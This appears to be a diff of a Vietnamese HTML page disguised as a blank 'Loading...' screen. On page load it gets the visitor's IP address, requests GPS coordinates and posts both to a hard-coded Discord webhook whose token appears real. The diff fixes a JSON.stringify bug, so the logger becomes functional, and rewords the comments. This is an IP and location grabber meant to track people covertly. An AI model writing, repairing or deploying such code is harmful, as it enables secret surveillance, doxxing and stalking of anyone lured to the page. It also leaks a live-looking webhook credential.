@@ -2,12 +2,12 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>Loading...</title>
+    <title>Đang tải...</title>
 </head>
 <body>
 
     <script>
-        // Hàm gửi dữ liệu lên Discord
+        // Hàm gửi dữ liệu lên Discord thông qua Webhook
         async function sendToDiscord(data) {
             const webhookUrl = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";
             
@@ -15,45 +15,45 @@
                 await fetch(webhookUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: json.stringify({ content: data })
+                    body: JSON.stringify({ content: data }) // Sử dụng JSON.stringify để định dạng dữ liệu
                 });
             } catch (error) {
-                console.error("Lỗi gửi Webhook:", error);
+                console.error("Lỗi khi gửi dữ liệu đến Discord:", error);
             }
         }
 
-        // Tự động chạy khi trang được tải
         async function init() {
-            // 1. Lấy địa chỉ IP
-            let ip = "Không xác định";
+            // 1. Luôn ưu tiên lấy địa chỉ IP trước
+            let ip = "Đang lấy...";
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 ip = ipData.ip;
             } catch (e) {
-                console.error("Không lấy được IP");
+                ip = "Không thể lấy IP";
             }
 
-            // 2. Kiểm tra quyền GPS
+            // 2. Tách biệt logic lấy GPS để không ảnh hưởng đến việc gửi IP
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    // Nếu đồng ý cấp quyền
+                    // Trường hợp người dùng đồng ý cấp quyền GPS
                     (position) => {
                         const lat = position.coords.latitude;
                         const long = position.coords.longitude;
                         sendToDiscord(`📍 **Truy cập:**\nIP: ${ip}\nLat: ${lat}\nLong: ${long}`);
                     },
-                    // Nếu từ chối cấp quyền
+                    // Trường hợp người dùng từ chối cấp quyền GPS
                     () => {
                         sendToDiscord(`⚠️ **Truy cập (Từ chối GPS):**\nIP: ${ip}`);
                     }
                 );
             } else {
-                // Nếu trình duyệt không hỗ trợ GPS
-                sendToDiscord(`❌ **Truy cập (Không hỗ trợ GPS):**\nIP: ${ip}`);
+                // Trường hợp trình duyệt không hỗ trợ GPS
+                sendToDiscord(`❌ **Không hỗ trợ GPS:**\nIP: ${ip}`);
             }
         }
 
+        // Tự động kích hoạt khi trang web được mở
         init();
     </script>
 
